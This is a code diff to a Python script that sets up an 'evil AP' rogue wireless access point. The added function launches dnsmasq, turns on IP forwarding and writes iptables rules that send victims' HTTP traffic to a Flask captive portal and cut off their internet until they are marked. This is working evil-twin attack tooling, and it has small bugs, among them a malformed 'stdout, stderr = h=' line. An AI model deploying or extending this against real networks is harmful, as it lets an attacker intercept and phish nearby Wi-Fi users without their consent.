@@ -41,7 +41,7 @@ def start_dns_dhcp():
 
     try:
         subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"],stderr=subprocess.DEVNULL)
-        subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"],stderr=subprocess.DEVNULL, check=True) #depend on linux dist
+        #subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"],stderr=subprocess.DEVNULL, check=True) #depend on linux dist
         subprocess.run(["sudo", "killall", "dnsmasq"], stderr=subprocess.DEVNULL)
         time.sleep(1)
         print("[*] Launching dnsmasq")
@@ -166,6 +166,61 @@ def create_evil_ap(INTERFACE, ap):
         print(f"[-] Failed to execute hostapd: {e}")
         sys.exit(1)   
 
+
+#function for isolating variables in my code
+def setup_network(EV_INTERFACE):
+    print("[*] Configuring firewall rules...")
+    print("[*] Stopping existing dnsmasq..")
+
+    try:
+        subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"],stderr=subprocess.DEVNULL)
+        #subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"],stderr=subprocess.DEVNULL, check=True) / depend on linux dist
+        subprocess.run(["sudo", "killall", "dnsmasq"], stderr=subprocess.DEVNULL)
+        time.sleep(1)
+        print("[*] Launching dnsmasq")
+        dnsmasq_proc = subprocess.Popen(
+        ["sudo","dnsmasq", "-C", "/etc/dnsmasq.conf", "-d"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT)
+        
+        time.sleep(2)
+        
+        if dnsmasq_proc.poll() is not None:
+            stdout, stderr = h=dnsmasq_proc.communicate()
+            print(f"[-] dnsmasq failed to start. Error output:\n{stderr}")
+            print(f"[-] dnsmasq failed to start. Error output:\n{stdout}")
+            sys.exit(1)
+        
+        print("[+] dnsmasq is fine, now firewall rules changing...")
+
+    
+        # =========================================================================
+        # 3. START FRESH RULES (With corrected '-m mark' syntax)
+        # =========================================================================
+        # Enable IP forwarding
+        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
+        
+        # Create the custom chain inside mangle (Guaranteed to succeed now!)
+        subprocess.run(["sudo", "iptables", "-t", "mangle", "-N", "captive_portal"], check=True)
+        
+        # Route evil AP traffic into our custom chain
+        subprocess.run(["sudo", "iptables", "-t", "mangle", "-A", "PREROUTING", "-i", EV_INTERFACE, "-j", "captive_portal"], check=True)
+        
+        # Intercept HTTP traffic on port 80 and redirect to Flask portal
+        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "80", "-m", "mark", "!", "--mark", "1", "-j", "REDIRECT", "--to-ports", "5000"], check=True)
+        
+        # Block internet forwarding for unauthenticated marks
+        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", EV_INTERFACE, "-m", "mark", "!", "--mark", "1", "-j", "DROP"], check=True)
+        subprocess.run(["sudo", "iptables", "-I", "INPUT", "-i", EV_INTERFACE, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], check=True)
+        subprocess.run(["sudo", "iptables", "-I", "INPUT", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], check=True)
+        
+        print("[+] Captive portal firewall active.")
+        return dnsmasq_proc
+        
+    except subprocess.CalledProcessError as e:
+        print(f"[-] Firewall configuration failed: {e}")
+        exit(1)
+
 def set_firewall_rules1(EV_INTERFACE):
     try:
         # 1. Enable IP forwarding
@@ -193,3 +248,5 @@ def set_firewall_rules1(EV_INTERFACE):
         print("[+] Captive portal firewall locked down on Port 80.")
     except subprocess.CalledProcessError as e:
         print(f"[!] Firewall setup failed: {e}")
+
+
